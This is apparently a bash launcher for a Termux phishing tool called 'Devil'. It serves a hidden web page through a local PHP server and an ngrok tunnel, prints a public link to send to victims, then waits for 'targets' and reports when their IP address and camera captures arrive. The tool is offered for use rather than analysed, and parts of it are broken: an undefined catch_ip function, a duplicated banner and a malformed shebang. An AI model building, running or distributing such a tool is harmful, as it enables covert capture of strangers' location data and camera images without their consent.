#!bin/bash
clear 

# Add some colours
red='\033[1;31m'
green='\033[1;32m'
yellow='\033[1;33m'
blue='\033[1;34m'
light_cyan='\033[1;96m'
reset='\033[0m'


printf "   ${red}###########################################################   \n"
printf "          ##   ${green}                                       ##   \n"
printf "          ##   ${green}######  ####### #     # ### #          ##   \n"
printf "          ##   ${green}#     # #       #     #  #  #          ##   \n"
printf "          ##   ${green}#     # #       #     #  #  #          ##   \n"
printf "          ##   ${red}#     # #####   #     #  #  #          ##     \n"
printf "          ##   ${green}#     # #        #   #   #  #          ##   \n"
printf "          ##   ${green}#     # #         # #    #  #          ##   \n"
printf "          ##   ${green}######  #######    #    ### #######    ##   \n"
printf "          ##   ${green}                                       ##   \n"
printf "    ${red}########  ######## DJshalani 1.1v ########################   \n"
printf "${red} \n"
printf "${red} \n"
printf "${red} \n"

printf "    ${blue}[+] YouTube : White Devil     \n"
printf "\n"
printf "    ${blue}[+] GitHub  : DJshalani \n"
printf "\n"
printf "    ${blue}[+] Email   : Devilshalani@gmail.com \n"
printf "\n"
printf "\n"
printf "    ${green}[=] Devil Exploiting Using Webhosting\n"
printf "\n"
printf "    ${green}[+] Type devil To Tun This Tool\n"




printf "\n"
printf "\n"
printf "\n"
printf "\n"











cd /data/data/com.termux/files/usr/share/devil/index/
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
ngrok http 3333 > /dev/null 2>&1 &
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link





checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 
}





# Add some colours
red='\033[1;31m'
green='\033[1;32m'
yellow='\033[1;33m'
blue='\033[1;34m'
light_cyan='\033[1;96m'
reset='\033[0m'


function banner(){

printf "   ${red}###########################################################   \n"
printf "          ##   ${green}                                       ##   \n"
printf "          ##   ${green}######  ####### #     # ### #          ##   \n"
printf "          ##   ${green}#     # #       #     #  #  #          ##   \n"
printf "          ##   ${green}#     # #       #     #  #  #          ##   \n"
printf "          ##   ${red}#     # #####   #     #  #  #          ##     \n"
printf "          ##   ${green}#     # #        #   #   #  #          ##   \n"
printf "          ##   ${green}#     # #         # #    #  #          ##   \n"
printf "          ##   ${green}######  #######    #    ### #######    ##   \n"
printf "          ##   ${green}                                       ##   \n"
printf "    ${red}########  ######## DJshalani 1.1v ########################   \n"
printf "${red} \n"
printf "${red} \n"
printf "${red} \n"

printf "    ${blue}[+] YouTube : White Devil     \n"
printf "\n"
printf "    ${blue}[+] GitHub  : DJshalani \n"
printf "\n"
printf "    ${blue}[+] Email   : Devilshalani@gmail.com \n"
printf "\n"
printf "\n"
printf "    ${green}[=] Devil Exploiting Using Webhosting\n"
printf "\n"
printf "    ${green}[+] Type devil To Tun This Tool\n"




printf "\n"
printf "\n"
printf "\n"
printf "\n"






}

checkfound
